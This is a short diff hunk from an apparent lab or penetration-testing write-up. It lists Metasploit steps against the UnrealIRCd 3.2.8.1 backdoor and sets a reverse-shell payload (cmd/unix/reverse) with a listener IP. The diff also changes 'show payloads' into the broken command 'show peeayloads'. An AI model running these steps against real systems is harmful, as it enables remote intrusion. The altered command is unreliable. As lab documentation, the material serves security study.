@@ -102,7 +102,7 @@ Steps:
    - `spool ./exploits/unrealircd-exploit.txt`
    - `use exploit/unix/irc/unreal_ircd_3281_backdoor`
 2. Initial run without payload selection failed and produced “Exploit failed: A payload has not been selected”, so a compatible payload was selected:
-   - `show payloads`
+   - `show peeayloads`
    - `set PAYLOAD cmd/unix/reverse`
 3. Set listener IP and target:
    - `set LHOST 10.10.30.101`
